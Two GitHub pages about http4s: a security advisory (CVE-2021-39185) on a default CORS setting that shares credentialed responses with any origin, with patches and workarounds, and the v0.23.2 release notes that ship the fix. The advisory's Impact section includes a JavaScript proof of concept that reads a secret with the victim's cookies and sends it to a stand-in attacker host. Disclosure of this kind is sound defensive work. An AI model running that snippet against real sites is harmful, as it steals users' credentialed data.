=== Content from github.com_05b466bb_20250115_082321.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhttp4s%2Fhttp4s%2Fsecurity%2Fadvisories%2FGHSA-52cf-226f-rhr6)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhttp4s%2Fhttp4s%2Fsecurity%2Fadvisories%2FGHSA-52cf-226f-rhr6)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=http4s%2Fhttp4s)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[http4s](/http4s)
/
**[http4s](/http4s/http4s)**
Public

* [Notifications](/login?return_to=%2Fhttp4s%2Fhttp4s) You must be signed in to change notification settings
* [Fork
  791](/login?return_to=%2Fhttp4s%2Fhttp4s)
* [Star
   2.6k](/login?return_to=%2Fhttp4s%2Fhttp4s)

* [Code](/http4s/http4s)
* [Issues
  242](/http4s/http4s/issues)
* [Pull requests
  93](/http4s/http4s/pulls)
* [Discussions](/http4s/http4s/discussions)
* [Actions](/http4s/http4s/actions)
* [Projects
  0](/http4s/http4s/projects)
* [Security](/http4s/http4s/security)
* [Insights](/http4s/http4s/pulse)

Additional navigation options

* [Code](/http4s/http4s)
* [Issues](/http4s/http4s/issues)
* [Pull requests](/http4s/http4s/pulls)
* [Discussions](/http4s/http4s/discussions)
* [Actions](/http4s/http4s/actions)
* [Projects](/http4s/http4s/projects)
* [Security](/http4s/http4s/security)
* [Insights](/http4s/http4s/pulse)

# Default CORS config allows any origin with credentials

High

[rossabaker](/rossabaker)
published
GHSA-52cf-226f-rhr6
Sep 1, 2021

## Package

maven

org.http4s :: http4s-server
([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

<= 0.21.26, 0.22.0 through 0.22.2, 0.23.0, 0.23.1, 1.0.0-M1 through 1.0.0-M24

## Patched versions

0.21.27, 0.22.3, 0.23.2, 1.0.0-M25

## Description

### Impact

#### Origin reflection attack

The default CORS configuration is vulnerable to an origin reflection attack. Take the following http4s app `app`, using the default CORS config, running at <https://vulnerable.example.com>:

```
val routes: HttpRoutes[F] = HttpRoutes.of {
  case req if req.pathInfo === "/secret" =>
    Response(Ok).withEntity(password).pure[F]
}
val app = CORS(routes.orNotFound)
```

The following request is made to our server:

```
GET /secret HTTP/1.1
Host: vulnerable.example.com
Origin: https://adversary.example.net
Cookie: sessionId=...
```

When the `anyOrigin` flag of `CORSConfig` is `true`, as is the case in the default argument to `CORS`, the middleware will allow sharing its resource regardless of the `allowedOrigins` setting. Paired with the default `allowCredentials`, the server approves sharing responses that may have required credentials for sensitive information with any origin:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://adversary.example.org
Access-Control-Allow-Credentials: true
Content-Type: text/plain

p4ssw0rd
```

A malicious script running on `https://adversary.example.org/` can then exfiltrate sensitive information with the user's credentials to `vulnerable.exmaple.org`:

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable.example.org/secret',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//bad-people.example.org/log?key='+this.responseText;
};
```
#### Null origin attack

The middleware is also susceptible to a Null Origin Attack. A user agent may send `Origin: null` when a request is made from a sandboxed iframe. The CORS-wrapped http4s app will respond with `Access-Control-Allow-Origin: null`, permitting a similar exfiltration of secrets to the above.

### Patches

The problem is fixed in 0.21.27, 0.22.3, 0.23.2, and 1.0.0-M25. The original `CORS` implementation and `CORSConfig` are deprecated. In addition to the origin vulnerability, the following deficiencies in the deprecated version are fixed in the new signatures:

### Migration

The `CORS` object exposes a default `CORSPolicy` via `CORS.policy`. This can be configured with various `with*` methods, like any http4s builder. Finally, the `CORSPolicy` may be applied to any `Http`, like any other http4s middleware:

```
val routes: HttpRoutes[F] = ???
val cors = CORS.policy
  .withAllowOriginAll
  .withAllowCredentials(false)
  .apply(routes)
```
### Workarounds

It is possible to be safe in unpatched versions, but note the following defects exist:

* The `anyMethod` flag, enabled by default, accepts methods that cannot be enumerated in the `Access-Control-Allow-Methods` preflight response.
* Rejected CORS requests receive a `403` response, when the client should be the enforcement point. The server should just omit all CORS response headers.
* Does not send `Vary: Access-Control-Request-Headers` on preflight requests. This may confuse caches.
* Does not validate the `Access-Control-Request-Headers` of a preflight request. This validation is not mandated by the Fetch standard, but is typical of most server implementations.
* Needlessly sends `Vary: Access-Control-Request-Method` on non-preflight requests. This should be harmless in practice.
* Needlessly sends `Access-Control-Max-Age` header on non-preflight requests. This should be harmless in practice.
* Sends an invalid `Access-Control-Allow-Credentials: false` instead of omitting the header. This should be harmless in practice.

#### Explicit origins

In versions before the patch, set `anyOrigin` to `false`, and then specifically include trusted origins in `allowedOrigins`.

##### 0.21.x

```
val routes: HttpRoutes[F] = ???
val config = CORS.DefaultConfig.copy(
  anyOrigin = false,
  allowOrigins = Set("http://trusted.example.com")
)
val cors = CORS(routes, config)
```
###### 0.22.x, 0.23.x, 1.x

```
val routes: HttpRoutes[F] = ???
val config = CORSConfig.default
  .withAnyOrigin(false)
  .withAllowedOrigins(Set("http://trusted.example.com"))
val cors = CORS(routes, config)
```
#### Disable credentials

Alternatively, sharing responses tainted by credentials can be deprecated.

##### 0.21.x

```
val routes: HttpRoutes[F] = ???
val config = CORS.DefaultConfig.copy(allowCredentials = false)
val cors = CORS(routes, config)
```
##### 0.22.x, 0.23.x, 1.x

```
val routes: HttpRoutes[F] = ???
val config = CORSConfig.default.withAllowedCredentials(false)
val cors = CORS(routes, config)
```
### References

* The [MDN guide to CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
* [PayloadsAllTheThings CORS misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/6cba7ceda93c3f64559c3e73881c21076536e5fb/CORS%20Misconfiguration/README.md)

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [GitHub](https://github.com/http4s/http4s)
* Contact us via the [http4s security policy](https://github.com/http4s/http4s/security/policy)

### Severity

High

### CVE ID

CVE-2021-39185

### Weaknesses

No CWEs

### Credits

* [![@bplommer](https://avatars.githubusercontent.com/u/8990749?s=40&v=4)](/bplommer)
  [bplommer](/bplommer)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_5b76d7e2_20250115_082321.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhttp4s%2Fhttp4s%2Freleases%2Ftag%2Fv0.23.2)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fhttp4s%2Fhttp4s%2Freleases%2Ftag%2Fv0.23.2)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=http4s%2Fhttp4s)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[http4s](/http4s)
/
**[http4s](/http4s/http4s)**
Public

* [Notifications](/login?return_to=%2Fhttp4s%2Fhttp4s) You must be signed in to change notification settings
* [Fork
  791](/login?return_to=%2Fhttp4s%2Fhttp4s)
* [Star
   2.6k](/login?return_to=%2Fhttp4s%2Fhttp4s)

* [Code](/http4s/http4s/tree/v0.23.2)
* [Issues
  242](/http4s/http4s/issues)
* [Pull requests
  93](/http4s/http4s/pulls)
* [Discussions](/http4s/http4s/discussions)
* [Actions](/http4s/http4s/actions)
* [Projects
  0](/http4s/http4s/projects)
* [Security](/http4s/http4s/security)
* [Insights](/http4s/http4s/pulse)

Additional navigation options

* [Code](/http4s/http4s/tree/v0.23.2)
* [Issues](/http4s/http4s/issues)
* [Pull requests](/http4s/http4s/pulls)
* [Discussions](/http4s/http4s/discussions)
* [Actions](/http4s/http4s/actions)
* [Projects](/http4s/http4s/projects)
* [Security](/http4s/http4s/security)
* [Insights](/http4s/http4s/pulse)

1. [Releases](/http4s/http4s/releases)
2. [v0.23.2](/http4s/http4s/releases/tag/v0.23.2)

# v0.23.2

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/http4s/http4s/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v0.23.2)

 Loading

[View all tags](/http4s/http4s/tags)

![@rossabaker](https://avatars.githubusercontent.com/u/142698?s=40&v=4)
[rossabaker](/rossabaker)
released this
01 Sep 18:16

·
[5934 commits](/http4s/http4s/compare/v0.23.2...main)
to main
since this release

[v0.23.2](/http4s/http4s/tree/v0.23.2)

This tag was signed with the committer’s **verified signature**.

[![](https://avatars.githubusercontent.com/u/142698?s=64&v=4)](/rossabaker)
[rossabaker](/rossabaker)
Ross A. Baker

GPG key ID: 975BE5BC29D92CA5

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

[`5ebfb74`](/http4s/http4s/commit/5ebfb746ff98817959cbcce3ab2520342253c608)

This release includes a security patch to [GHSA-52cf-226f-rhr6](https://github.com/http4s/http4s/security/advisories/GHSA-52cf-226f-rhr6), along with all changes in v0.22.3.

This release is binary compatible with the 0.23 series.

## http4s-core

### Enhancements

* [#5085](https://github.com/http4s/http4s/pull/5085): Make `EntityEncoder`s for `File`, `Path`, and `InputStream` implicit. Since 0.23, they no longer require an explicit `Blocker` parameter, using Cats-Effect 3's runtime instead.

## http4s-blaze-server

### Bug fixes

* [#5118](https://github.com/http4s/http4s/pull/5118): Don't block the `TickWheelExecutor` on cancellation. In-flight responses are canceled when a connection shuts down. If the response cancellation hangs, it blocks the `TickWheelScheduler` thread. When this thread blocks, subsequent scheduled events are not processed, and memory leaks with each newly scheduled event.

### Enhancements

* [#4782](https://github.com/http4s/http4s/pull/4782): Use `Async[F].executionContext` as a default `ExecutionContext` in `BlazeServerBuilder`.

## http4s-ember-server

* [#5106](https://github.com/http4s/http4s/pull/5106): Demote noisy `WebSocket connection terminated with exception` message to trace-level logging on broken pipes. This relies on exception message parsing and may not work well in all locales.

## Dependency updates

* cats-effect-3.2.5
* fs2-3.1.1

 Assets
2

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


